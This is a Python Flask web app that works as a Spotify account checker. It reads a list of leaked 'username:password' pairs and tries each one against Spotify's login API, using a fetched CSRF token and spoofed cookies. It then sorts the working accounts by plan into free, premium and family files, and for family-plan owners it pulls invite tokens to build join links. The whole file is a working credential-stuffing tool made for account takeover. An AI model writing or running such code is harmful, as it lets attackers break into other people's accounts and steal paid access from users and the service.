from flask import Flask, render_template, request, url_for, redirect
import json
import requests
from lxml import html
from bs4 import BeautifulSoup
import traceback
import math
app = Flask(__name__)
@app.route("/")
@app.route("/main")
def main():
    return render_template("index.html")

@app.route("/error")
def error():
    return "Something unexpected has occurred."

@app.route("/free")
def free():
    with open("free.txt", "r") as free:
        accs = free.readlines()
    return render_template("list.html", accs=accs)

@app.route("/premium")
def premium():
    with open("premium.txt", "r") as premium:
        accs = premium.readlines()
    return render_template("list.html", accs=accs)

@app.route("/family")
def family():
    with open("family.txt", "r") as family:
        accs = family.readlines()
    return render_template("list.html", accs=accs)

@app.route("/file_received", methods=["POST"])
def file_received():
    open("premium.txt","w").close()
    open("family.txt","w").close()
    open("free.txt","w").close()
    if request.method == "POST":
        accounts_file = request.form.get("account-list")
        try:
            account = []
            with open (accounts_file, "r") as content:
                accounts = content.readlines()
            for idx,line in enumerate(accounts):
                div = line.split(":")
                try:
                    account.append([div[0], div[1].split("|")[0].replace(" ",""), "not_checked"])
                except:
                    account.append([div[0], div[1], "not_checked"])
            for cnt, user in enumerate(account):
                max_accs = len(account)
                if(cnt%10 == 0):
                    print(str(cnt) + "/" + str(max_accs))
                pl = {
                "remember": "false",
                "username": user[0].replace("\n", ""),
                "password" : user[1].replace("\n", ""),
                "csrf_token": "test"
                }
                with requests.Session() as api_request:
                    while True:
                        csrf_request = requests.get('https://accounts.spotify.com')
                        if csrf_request.status_code == 200:
                            break
                    csrf = csrf_request.cookies.get("csrf_token")
                    cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
                    pl["csrf_token"] = csrf
                    
                    response = api_request.post("https://accounts.spotify.com/api/login", data=pl,cookies=cookies)
                    
                    
                    try:
                        while True:
                            new_response = api_request.get('https://www.spotify.com/en/account/overview/')
                            if new_response.status_code == 200:
                                break
                        dash = new_response.text
                        soup = BeautifulSoup(dash, "lxml")
                        plan = soup.find("body")["class"]
                        if("overview-free" in plan):
                            user[2] = "(FREE-PLAN)"
                            with open ("free.txt", "a") as free:
                                free.write(user[0] + ":" + user[1])
                        elif("overview-premium" in plan):
                            user[2] = "(PREMIUM-PLAN)"
                            with open ("premium.txt", "a") as premium:
                                premium.write(user[0] + ":" + user[1])
                        elif("overview-new-family" in plan):
                            user[2] = "(FAMILY-PLAN)"
                            try:
                                while True:
                                    new_date = api_request.get('https://www.spotify.com/es/home-hub/api/v1/family/home/')
                                    if new_date.status_code == 200:
                                        break
                                res = new_date.json()
                                link = ("https://www.spotify.com/es/family/join/invite/" + res["inviteToken"])
                                user[2] = ("(FAMILY-OWNER) " + link)
                                with open ("family.txt", "a") as family:
                                    family.write(user[0] + ":" + user[1] + "|" + link + "\n")
                            except:
                                with open ("family.txt", "a") as family:
                                    family.write(user[0] + ":" + user[1])
                        elif("overview-cancel-recurring" in plan):
                            
                            while True:
                                new_date = api_request.get('https://www.spotify.com/es/home-hub/api/v1/family/home/')
                                if new_date.status_code == 200:
                                    break
                            res = new_date.json()
                            link = ("https://www.spotify.com/es/family/join/invite/" + res["inviteToken"])
                            user[2] = ("(FAMILY-OWNER) " + link)
                            with open ("family.txt", "a") as family:
                                family.write(user[0].replace("\n", "") + ":" + user[1].replace("\n", "") + "|" + link + "\n")
                        
                        else:
                            user[2] = "False"   
                    except:
                        user[2] = "False"
                        pass
            return render_template("login.html", account=account)
        except Exception as e:
            print(e)
            traceback.print_exc()
            return redirect(url_for("error", account=account))
if __name__ == "__main__":
    app.run(port="1337")